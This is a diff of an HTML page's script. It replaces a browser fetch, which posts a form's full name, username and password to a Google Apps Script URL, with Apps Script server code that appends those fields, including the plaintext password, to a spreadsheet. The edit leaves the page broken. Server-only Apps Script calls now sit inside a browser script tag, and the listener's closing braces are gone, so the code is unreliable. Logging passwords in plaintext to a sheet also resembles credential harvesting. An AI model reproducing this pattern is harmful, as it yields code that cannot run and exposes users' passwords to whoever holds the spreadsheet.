@@ -12,21 +12,23 @@
       password: document.getElementById("password").value
     };
 
-    fetch("https://script.google.com/macros/s/AKfycbxM11XY1is8hHw-bzdf9CIGKhw-9WToYBnCUk9jN-7o-6Hxf4j-JdCS5a-Q0vV9X9bH/exec", {
-      method: "POST",
-      body: JSON.stringify(data),
-      headers: {
-        "Content-Type": "application/json"
-      }
-    })
-    .then(response => response.text())
-    .then(result => {
-      alert("Server Response: " + result);
-    })
-    .catch(error => {
-      alert("Error: " + error);
-    });
-  });
+  function doPost(e) {
+  try {
+    var sheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet();
+    var data = JSON.parse(e.postData.contents);
+
+    sheet.appendRow([
+      data.fullname,
+      data.username,
+      data.password,
+      new Date()
+    ]);
+
+    return ContentService.createTextOutput("Success").setMimeType(ContentService.MimeType.TEXT);
+  } catch (error) {
+    return ContentService.createTextOutput("Error: " + error).setMimeType(ContentService.MimeType.TEXT);
+  }
+}
 </script>
 </head>
 <body>
